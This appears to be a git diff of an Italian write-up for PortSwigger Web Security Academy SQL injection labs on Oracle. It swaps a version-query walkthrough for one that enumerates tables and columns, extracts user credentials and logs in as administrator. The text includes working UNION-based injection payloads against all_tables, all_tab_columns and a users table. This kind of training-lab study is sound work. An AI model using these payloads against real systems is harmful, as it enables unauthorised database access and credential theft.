@@ -1,44 +1,57 @@
- Lab: SQL injection attack, querying the database type and version on Oracle
+Lab: SQL injection attack, listing the database contents on Oracle
 
-📝 Descrizione
+Descrizione
 
-Questo laboratorio di PortSwigger presenta una vulnerabilità di **SQL Injection** nel filtro delle categorie di prodotto.  
-L’obiettivo del lab è sfruttare questa vulnerabilità per eseguire una **UNION-based SQL Injection** e visualizzare la **stringa di versione del database Oracle**.
-
-> 💡 Suggerimento: Nei database Oracle ogni query `SELECT` deve contenere una clausola `FROM`, anche nelle UNION.  
-> Oracle fornisce una tabella speciale chiamata `dual` che può essere utilizzata per questo scopo.  
-Esempio:  `UNION SELECT 'abc' FROM dual`
+Il lab contiene una SQL injection nel filtro della categoria dei prodotti.  
+L'obiettivo è sfruttare un attacco UNION per elencare le tabelle e le colonne presenti nel database Oracle, ottenere username e password degli utenti e accedere come **administrator**.
 
 ---
 
-⚙️ Passaggi Eseguiti
+Passaggi eseguiti
 
-1. Ho aperto il sito vulnerabile e navigato nel filtro **product category**.
-2. Ho avviato **Burp Suite** in modalità proxy e intercettato la richiesta HTTP generata dal filtro categoria.
-3. Ho individuato il parametro vulnerabile `category` e testato una semplice **SQL Injection di tipo UNION** per determinare il numero di colonne e il tipo di dati.
-4. Dopo aver verificato che la query accetta due colonne di tipo testo, ho modificato il payload per recuperare la versione del database Oracle.
+1. Intercettata la richiesta con Burp Suite sul parametro `category`.
+2. Verificata la vulnerabilità e il numero di colonne con:
+
+' UNION SELECT 'abc','def' FROM dual--
+
+3. Elencate le tabelle disponibili nel database Oracle:
+
+' UNION SELECT table_name,NULL FROM all_tables--
+
+Individuata la tabella contenente le credenziali (es. `USERS_ABCDEF`).
+
+4. Recuperati i nomi delle colonne della tabella:
+
+' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'--
+
+Identificate le colonne `USERNAME_ABCDEF` e `PASSWORD_ABCDEF`.
+
+5. Estratti i dati degli utenti:
+
+' UNION SELECT USERNAME_ABCDEF,PASSWORD_ABCDEF FROM USERS_ABCDEF--
+
+6. Trovata la password dell'utente `administrator`, utilizzata per effettuare il login.
 
 ---
 
-🧠 Ragionamento Tecnico
+Ragionamento tecnico
 
-- Una **UNION-based SQL Injection** consente di combinare i risultati di più query `SELECT` in un'unica risposta.
-- Per Oracle, è obbligatorio specificare una tabella anche quando si usa `UNION SELECT`, ed è per questo che si usa la tabella speciale `dual`.
-- Il primo step consiste nel capire **quante colonne** sono restituite dalla query originale.
-
-Per farlo, si può testare un payload come:
-
-    ' UNION SELECT 'abc','def' FROM dual--
-    
-Se la pagina carica correttamente senza errori, significa che la query sottostante restituisce due colonne, entrambe compatibili con dati di tipo stringa.
-Una volta stabilito il numero e tipo di colonne, si può costruire un payload per interrogare la **vista `v$version`**, che contiene informazioni sulla versione del database Oracle.
+In Oracle è obbligatorio specificare una tabella anche in una `SELECT` statica. Si utilizza la tabella built-in `dual` per soddisfare questa condizione.  
+L’attacco sfrutta una SQL injection di tipo UNION-based per accedere a metadati (`all_tables`, `all_tab_columns`) e dati sensibili.
 
 ---
 
-✅ Soluzione Finale
+Soluzione finale
 
-🔐 Payload usato:
-' UNION SELECT BANNER, NULL FROM v$version--
+**Payload principali:**
 
-- `BANNER` è una colonna della vista `v$version` che contiene stringhe con le informazioni sulla versione di Oracle.
-- La seconda colonna è riempita con `NULL` per rispettare la struttura a due colonne.
+- Verifica colonne:' UNION SELECT 'abc','def' FROM dual--
+
+- Elenco tabelle:' UNION SELECT table_name,NULL FROM all_tables--
+
+- Elenco colonne:' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'--
+
+- Estrazione credenziali:' UNION SELECT USERNAME_ABCDEF,PASSWORD_ABCDEF FROM USERS_ABCDEF--
+
+
+Login come `administrator` completato ✅
